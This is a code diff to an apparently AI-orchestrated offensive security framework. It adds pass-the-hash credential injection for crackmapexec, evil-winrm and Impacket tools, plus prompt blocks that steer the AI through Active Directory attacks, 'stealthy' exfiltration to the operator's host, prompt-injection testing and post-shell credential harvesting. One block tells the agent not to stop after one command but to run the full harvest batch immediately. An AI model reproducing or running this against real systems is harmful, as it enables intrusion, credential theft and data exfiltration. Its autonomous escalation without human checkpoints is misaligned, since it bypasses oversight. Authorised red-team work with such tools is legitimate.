@@ -55,6 +55,10 @@ from core import exploit_map as _exploit_map
 from core import callback as _callback
 from core import msf_resolver as _msf_resolver
 from core import pivot as _pivot
+from core import ad_module as _ad
+from core import exfiltration as _exfil
+from core import llm_security as _llm_sec
+from core import post_shell as _post_shell
 from core.bruteforce_worker import BruteforceWorker
 from core.msf_rpc import MsfRpcClient
 
@@ -2854,9 +2858,24 @@ If Target Domain is provided ({session.target_domain}), ALWAYS use the domain na
             c for c in session.credentials
             if session.target_ip in (c.get('host', ''), c.get('service', ''), '')
         ]
-        cred = (creds_for_target or session.credentials)[0]
+        pool = creds_for_target or session.credentials
+        # Prefer plaintext-password creds (broad tool support); fall back to an
+        # NTLM hash for pass-the-hash against SMB/WinRM/Impacket tools only.
+        password_creds = [
+            c for c in pool if (c.get('secret_type') or 'password') != 'hash'
+        ]
+        hash_creds = [
+            c for c in pool if (c.get('secret_type') or 'password') == 'hash'
+        ]
+        cred = (password_creds or hash_creds or [None])[0]
+        if not cred:
+            return command
         user = (cred.get('username') or '').strip()
         passwd = (cred.get('secret') or '').strip()
+        is_hash = (cred.get('secret_type') or 'password') == 'hash'
+        # Only a 32-char hex NTLM hash is usable for pass-the-hash; anything else
+        # (e.g. a shadow-style "$" hash) is treated as an opaque password.
+        is_ntlm = bool(re.fullmatch(r'[0-9a-fA-F]{32}', passwd))
         quoted_smb_credential = shlex.quote(f"{user}%{passwd}")
 
         if not user:
@@ -2878,11 +2897,19 @@ If Target Domain is provided ({session.target_domain}), ALWAYS use the domain na
 
         # ── crackmapexec / nxc smb ───────────────────────────────────────────
         elif re.search(r'\b(?:crackmapexec|nxc)\s+smb\b', command) and '-u' not in command:
-            command = re.sub(
-                r'(\b(?:crackmapexec|nxc)\s+smb\b)',
-                lambda m: f"{m.group(0)} -u {shlex.quote(user)} -p {shlex.quote(passwd)}",
-                command, count=1
-            )
+            # NTLM hash → pass-the-hash (-H); plaintext → password (-p).
+            if is_ntlm:
+                command = re.sub(
+                    r'(\b(?:crackmapexec|nxc)\s+smb\b)',
+                    lambda m: f"{m.group(0)} -u {shlex.quote(user)} -H {shlex.quote(passwd)}",
+                    command, count=1
+                )
+            else:
+                command = re.sub(
+                    r'(\b(?:crackmapexec|nxc)\s+smb\b)',
+                    lambda m: f"{m.group(0)} -u {shlex.quote(user)} -p {shlex.quote(passwd)}",
+                    command, count=1
+                )
 
         # ── rpcclient ────────────────────────────────────────────────────────
         elif re.search(r'\brpcclient\b', command):
@@ -2897,7 +2924,10 @@ If Target Domain is provided ({session.target_domain}), ALWAYS use the domain na
 
         # ── evil-winrm ───────────────────────────────────────────────────────
         elif re.search(r'\bevil-winrm\b', command) and '-u' not in command:
-            command += f" -u {shlex.quote(user)} -p {shlex.quote(passwd)}"
+            if is_ntlm:
+                command += f" -u {shlex.quote(user)} -H {shlex.quote(passwd)}"
+            else:
+                command += f" -u {shlex.quote(user)} -p {shlex.quote(passwd)}"
 
         # ── mysql (empty-password shortcut) ──────────────────────────────────
         elif re.search(r'\bmysql\b', command) and '-p' not in command and passwd:
@@ -2909,14 +2939,23 @@ If Target Domain is provided ({session.target_domain}), ALWAYS use the domain na
 
         # ── psexec.py / wmiexec.py / secretsdump.py (Impacket) ───────────────
         elif re.search(r'\b(?:psexec|wmiexec|smbexec|secretsdump)\.py\b', command):
-            # Impacket tools accept DOMAIN/user:pass@ format; inject if plain IP used
+            # Impacket tools accept DOMAIN/user:pass@target; inject if plain IP used.
             if not re.search(r'[^/]@', command):
-                # Append before the target: tool.py [opts] user:pass@target
-                command = re.sub(
-                    r'''(?<= )(\d{1,3}(?:\.\d{1,3}){3}|[\w.-]+)(?= |$)''',
-                    lambda m: shlex.quote(f"{user}:{passwd}@{m.group(0)}"),
-                    command, count=1
-                )
+                if is_ntlm:
+                    # Pass-the-hash: impacket -hashes LMHASH:NTHASH user@target.
+                    command = re.sub(
+                        r'''(?<= )(\d{1,3}(?:\.\d{1,3}){3}|[\w.-]+)(?= |$)''',
+                        lambda m: (f"-hashes :{passwd} "
+                                   f"{shlex.quote(f'{user}@{m.group(0)}')}"),
+                        command, count=1
+                    )
+                else:
+                    # Append before the target: tool.py [opts] user:pass@target
+                    command = re.sub(
+                        r'''(?<= )(\d{1,3}(?:\.\d{1,3}){3}|[\w.-]+)(?= |$)''',
+                        lambda m: shlex.quote(f"{user}:{passwd}@{m.group(0)}"),
+                        command, count=1
+                    )
 
         return command
 
@@ -3481,7 +3520,7 @@ Subdomains found: {len(session.discovered_subdomains)}{f' — [{", ".join(sessio
 Web apps found: {len(session.web_applications)}{f' — [{", ".join(a.get("url","") for a in session.web_applications[:5])}]' if session.web_applications else ''}
 API endpoints: {len(session.discovered_api_endpoints)}
 Auto-execution depth: {session.auto_depth_counter}/{session.max_auto_depth}
-{self._operator_context_block(session)}{self._osint_context_block(session)}{self._coverage_context_block(session)}{self._exploit_hints_block(session)}{self._prioritized_cve_block(session)}{self._exhausted_context_block(session)}{self._compromise_context_block(session)}{self._handler_context_block(session)}{self._reachability_context_block(session)}{self._pivot_context_block(session)}{self._tools_context_block(session)}
+{self._operator_context_block(session)}{self._osint_context_block(session)}{self._coverage_context_block(session)}{self._ad_context_block(session)}{self._exfil_context_block(session)}{self._llm_security_context_block(session)}{self._exploit_hints_block(session)}{self._prioritized_cve_block(session)}{self._exhausted_context_block(session)}{self._compromise_context_block(session)}{self._handler_context_block(session)}{self._post_shell_context_block(session)}{self._reachability_context_block(session)}{self._pivot_context_block(session)}{self._tools_context_block(session)}
 Domain rule: If Target Domain is provided ({session.target_domain}), use domain name for all web tools — never IP.
 
 {self._get_relevant_threat_intel_context(session_id)}
@@ -7516,6 +7555,35 @@ Web apps: {webapps}
         )
         return "\n".join(lines)
 
+    def _ad_context_block(self, session: "Session") -> str:
+        """Surface Active Directory methodology + curated attacks when the target
+        looks like an AD/Windows domain environment. Always-on (not coverage-gated)
+        — a domain target must not be treated as a bare host."""
+        if not session.discovered_services:
+            return ""
+        ad = _ad.detect_ad_environment(session.discovered_services)
+        if not ad.get("ad"):
+            return ""
+        return _ad.ad_context_block(ad, session.credentials)
+
+    def _exfil_context_block(self, session: "Session") -> str:
+        """Surface the stealthy data-exfiltration methodology once a foothold
+        exists. Fades in only after access is proven (pointless before)."""
+        has_foothold = bool(session.compromise_evidence)
+        if not has_foothold:
+            return ""
+        loot_host = (session.exploit_lhost or
+                     os.getenv("EXPLOIT_LHOST", "").strip())
+        confirmed_loot = [e.get("proof", "") for e in session.compromise_evidence
+                          if e.get("proof")][:10]
+        return _exfil.exfil_context_block(has_foothold, loot_host,
+                                           confirmed_loot)
+
+    def _llm_security_context_block(self, session: "Session") -> str:
+        """Surface the offensive prompt-injection testing methodology when the
+        operator has enabled LLM-security testing for this engagement."""
+        return _llm_sec.llm_security_context_block()
+
     def _handler_context_block(self, session: "Session") -> str:
         """Tell the AI a managed listener is live and how to deliver shells to it.
         Empty until the handler has been auto-started (exploitation stage)."""
@@ -7553,6 +7621,49 @@ Web apps: {webapps}
             f"{session.exploit_lhost}:{session.exploit_lport}.\n"
             f"{_reach_line}"
         )
+
+    def _post_shell_context_block(self, session: "Session") -> str:
+        """Surface the multi-stage post-exploitation script once a session is
+        caught on the managed handler, so the AI runs a full recon/harvest batch
+        in one shot instead of dribbling commands one at a time."""
+        try:
+            shells = self.get_shell_sessions(session.session_id)
+        except Exception:
+            shells = []
+        open_shells = [s for s in shells if s.get("status") == "open"]
+        if not open_shells:
+            return ""
+        lines = ["\n=== POST-SHELL COMMAND DELIVERY (run a full batch now) ==="]
+        lines.append(
+            "A shell is live on the managed handler. Do NOT stop after one command "
+            "— immediately run the full post-exploitation batch below:"
+        )
+        for s in open_shells:
+            msf_id = s.get("msf_id")
+            handler_id = s.get("handler_id") or ""
+            stype = s.get("type") or "shell"
+            os_type = "linux" if stype == "meterpreter" and "linux" in (s.get("target_ip") or "") else stype
+            include_cred = bool(session.credentials) or session.target_os == "windows"
+            script = _post_shell.build_post_shell_script(
+                handler_id, msf_id, os_type, include_cred_harvest=include_cred
+            )
+            if not script:
+                continue
+            cmds = []
+            if "linux" in os_type.lower():
+                cmds = [c for _, c in _post_shell.LINUX_RECON]
+            else:
+                cmds = [c for _, c in _post_shell.WINDOWS_RECON]
+                if include_cred:
+                    cmds += [c for _, c in _post_shell.CRED_HARVEST]
+                    cmds += [c for _, c in _post_shell.AD_RECON]
+            lines.append(
+                f"- Session {msf_id} ({stype}): execute via "
+                f"`sessions -i {msf_id}` then run, in order: {', '.join(cmds)}."
+            )
+            lines.append(f"  One-shot batch: {script}")
+        lines.append("")
+        return "\n".join(lines)
 
     def _target_os_context_block(self, session: "Session") -> str:
         """Tell the tactical model which OS hypothesis is currently supported.
